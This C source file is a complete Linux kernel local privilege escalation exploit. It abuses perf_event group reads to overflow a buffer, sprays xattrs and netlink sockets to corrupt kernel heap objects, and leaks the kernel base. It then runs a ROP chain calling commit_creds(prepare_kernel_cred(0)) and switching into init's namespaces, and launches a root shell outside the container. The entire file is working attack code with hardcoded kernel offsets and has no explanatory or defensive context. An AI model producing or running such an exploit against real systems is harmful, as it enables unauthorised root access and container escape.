#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>

#define READ_BUF_SIZE 2048

#define SK_RCU_OFF 784
#define SK_DESTRUCT_OFF 760
#define JOP_OFF (READ_BUF_SIZE - SK_RCU_OFF + SK_DESTRUCT_OFF - XATTR_HDR_LEN)

#define XATTR_HDR_LEN 32
#define XATTR_DATA_LEN1 (READ_BUF_SIZE/2)
#define XATTR_DATA_LEN2 (JOP_OFF + 8)

/* How far after out to inc */
#define OOB_LOC1 728
#define OOB_LOC2 1056
/* Target event fds */
#define TFD1 ((READ_BUF_SIZE - 8 + OOB_LOC1)/8)
#define TFD2 ((READ_BUF_SIZE - 8 + OOB_LOC2)/8)
/* Number of increments */
#define NUM_INCS1 0x15e0
#define NUM_INCS2 0xf

#define NUM_SIBLINGS (65536/8 - 1 + READ_BUF_SIZE/8)

#define OBJS_PER_SLAB 16

#define SOCK_SLABS (2*OBJS_PER_SLAB)
#define SOCK_SPRAY (SOCK_SLABS*OBJS_PER_SLAB)

#define XATTR_SPRAY1 1000
#define XATTR_SPRAY2 (SOCK_SLABS*OBJS_PER_SLAB)
#define XATTR_SPRAY3 (SOCK_SLABS+OBJS_PER_SLAB)

#define PREPARE_KERNEL_CRED 0x10d180
#define COMMIT_CREDS 0x10ced0
#define FIND_TASK_BY_VPID 0x103d40
#define SWITCH_TASK_NAMESPACES 0x10b4f0

#define DO_SYS_VFORK 0x0de2b0
#define MSLEEP 0x168780

#define INIT_NSPROXY 0x2261f00

#define MOV_RSP_RBP_POP_RBP_RET 0x08034c
#define POP_RDI_RET_THUNK 0x0380b3
#define POP_RSI_RET_THUNK 0x008003
#define MOV_RDI_RAX_POP_RBX_RET_THUNK 0x02c691

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)

struct perf_event_attr attr;

int sib_fds[NUM_SIBLINGS];

long read_buf[8192];

int xattr_fd;

char xattr_data[XATTR_DATA_LEN2];


/*
 * Syscall wrappers.
 */

int perf_event_open(struct perf_event_attr *attr, pid_t pid, unsigned int cpu, int group_fd, unsigned long flags)
{
    return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

unsigned int cpu;
void pin_cpu () {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        err_exit("[-] sched_setaffinity");
}

void set_attr (void) {
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_PAGE_FAULTS;
    attr.disabled = 1;
    attr.exclude_kernel = 1;
    attr.exclude_hv = 1;
}

void prepare_rop (long *rop, long kbase) {
    rop[JOP_OFF/8] = kbase + MOV_RSP_RBP_POP_RBP_RET;

    rop += (JOP_OFF - SK_DESTRUCT_OFF)/8;
    /* commit_creds(prepare_kernel_cred(0)) */
    rop++;
    *rop++ = kbase + POP_RDI_RET_THUNK;
    *rop++ = 0;
    *rop++ = kbase + PREPARE_KERNEL_CRED;
    *rop++ = kbase + MOV_RDI_RAX_POP_RBX_RET_THUNK;
    rop++;
    *rop++ = kbase + COMMIT_CREDS;
    /* switch_task_namespaces(find_task_by_vpid(1, init_ns_proxy) */
    *rop++ = kbase + POP_RDI_RET_THUNK;
    *rop++ = 1;
    *rop++ = kbase + FIND_TASK_BY_VPID;
    *rop++ = kbase + POP_RSI_RET_THUNK;
    *rop++ = kbase + INIT_NSPROXY;
    *rop++ = kbase + MOV_RDI_RAX_POP_RBX_RET_THUNK;
    rop++;
    *rop++ = kbase + SWITCH_TASK_NAMESPACES;
    /* telefork */
    *rop++ = kbase + DO_SYS_VFORK;
    *rop++ = kbase + MSLEEP;
}

int num_xattr = 0;
int spray_simple_xattrs(int num_spray, void *xattr_val, int xattr_len) {
    char name[32];
    int ret = num_xattr;
    for (int i = 0; i < num_spray; i++, num_xattr++) {
        sprintf(name, "security.%d", num_xattr);
        if (fsetxattr(xattr_fd, name, xattr_val, xattr_len, 0) == -1)
            err_exit("[-] fsetxattr");
    }
    return ret;
}



int sock_fds[SOCK_SPRAY];
void spray_socks (void) {
    for (int i = 0; i < SOCK_SPRAY; i++) {
        sock_fds[i] = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sock_fds[i] == -1)
            err_exit("[-] socket");
    }
}

void inc_counters (int fd, int inc) {
    if (ioctl(fd, PERF_EVENT_IOC_ENABLE, 0) == -1)
        err_exit("[-] ioctl");
    for (int i = 0; i < inc; i++) {
        char *m = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        if (m == MAP_FAILED)
            err_exit("[-] mmap");
        m[0] = 0;
        if (munmap(m, 4096) == -1)
            err_exit("[-] munmap");
    }
    if (ioctl(fd, PERF_EVENT_IOC_DISABLE, 0) == -1)
        err_exit("[-] ioctl");
}

int main (int argc, char **argv) {
    char name[32];
    int num_events = 0;
    long kernel_base;
    int target_sock;
    int optval = 1;

    pin_cpu();
    set_attr();

    pid_t ppid = getpid();

    printf("[*] Opening events\n");

    attr.read_format = PERF_FORMAT_GROUP;
    attr.disabled = 0;
    sib_fds[0] = perf_event_open(&attr, ppid, -1, -1, 0);
    if (sib_fds[0] == -1)
        err_exit("[-] perf_event_open");
    attr.read_format = 0;
    attr.disabled = 1;

    for (int i = 1; i <= TFD2; i++) {
            sib_fds[i] = perf_event_open(&attr, ppid, -1, sib_fds[0], 0);
            if (sib_fds[i] == -1) {
                err_exit("[-] perf_event_open");
            }
    }

    inc_counters(sib_fds[TFD1], NUM_INCS1);
    inc_counters(sib_fds[TFD2], NUM_INCS2);

    for (int i = 0; i < 3; i++) {
        pid_t cpid = fork();
        if (cpid == -1)
            err_exit("[-] fork");
        if (cpid)
            continue;
        for (int j = 1; j <= 2048; j++) {
            sib_fds[j] = perf_event_open(&attr, ppid, -1, sib_fds[0], 0);
            if (sib_fds[j] == -1) {
                err_exit("[-] perf_event_open");
            }
        }
        sleep(-1);
    }

    while (num_events <= 2048*3 + TFD2) {
        if (read(sib_fds[0], read_buf, 65536) == -1)
            err_exit("[-] read");
        num_events = read_buf[0];
    }

    for (int i = TFD2 + 1; num_events < NUM_SIBLINGS; i++, num_events++) {
            sib_fds[i] = perf_event_open(&attr, ppid, -1, sib_fds[0], 0);
            if (sib_fds[i] == -1) {
                err_exit("[-] perf_event_open");
            }
    }

    printf("[*] Event group ready\n");

    xattr_fd = open("/tmp/", O_TMPFILE | O_RDWR, 0666);
    if (xattr_fd == -1)
        err_exit("[-] open");

    spray_simple_xattrs(XATTR_SPRAY1, xattr_data, XATTR_DATA_LEN1);
    int fill = spray_simple_xattrs(XATTR_SPRAY2, xattr_data, XATTR_DATA_LEN1);


    for (int i = fill; i < fill + XATTR_SPRAY2; i++) {
        if ((i - fill) % OBJS_PER_SLAB == 0)
            continue;
        sprintf(name, "security.%d", i);
        if (fremovexattr(xattr_fd, name) == -1)
            err_exit("[-] fremovexattr");
    }
    spray_socks();

    for (int i = fill; i < fill + XATTR_SPRAY2; i+=OBJS_PER_SLAB) {
        sprintf(name, "security.%d", i);
        if (fremovexattr(xattr_fd, name) == -1)
            err_exit("[-] fremovexattr");
    }

    spray_simple_xattrs(OBJS_PER_SLAB, xattr_data, XATTR_DATA_LEN1);

    if (read(sib_fds[0], read_buf, READ_BUF_SIZE) == -1)
        err_exit("[-] read");

    target_sock = -1;
    optval = 1;
    for (int i = 0; i < SOCK_SPRAY; i++) {
        int ret = setsockopt(sock_fds[i], SOL_NETLINK, NETLINK_ADD_MEMBERSHIP, &optval, sizeof(optval));
        if (ret) {
            kernel_base = 0xffffffff00000000 | (ret & 0xff000000);
            target_sock = sock_fds[i];
            break;
        }
    }

    if (target_sock == -1) {
        printf("[-] OOB failed\n");
        exit(1);
    }

    prepare_rop(xattr_data, kernel_base);
    spray_simple_xattrs(XATTR_SPRAY3, xattr_data, XATTR_DATA_LEN2);

    if (setsockopt(target_sock, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval)) == -1)
        err_exit("[-] setsockopt");

    printf("[+] Returned from ROP\n");

    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    int netns_fd = open("/proc/1/ns/net", O_RDONLY);
    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);

    if (mntns_fd == -1)
        perror("[-] open(/proc/1/ns/mnt)");
    if (setns(mntns_fd, CLONE_NEWNS) == -1)
        perror("[-] setns mnt");

    if (netns_fd == -1)
        perror("[-] open(/proc/1/ns/net)");
    if (setns(netns_fd, CLONE_NEWNET) == -1)
        perror("[-] setns net");

    if (pidns_fd == -1)
        perror("[-] open(/proc/1/ns/pid)");
    if (setns(pidns_fd, CLONE_NEWPID) == -1)
        perror("[-] setns pid");

    printf("[*] Launching shell\n");
    system("/bin/sh");
    return 0;
}
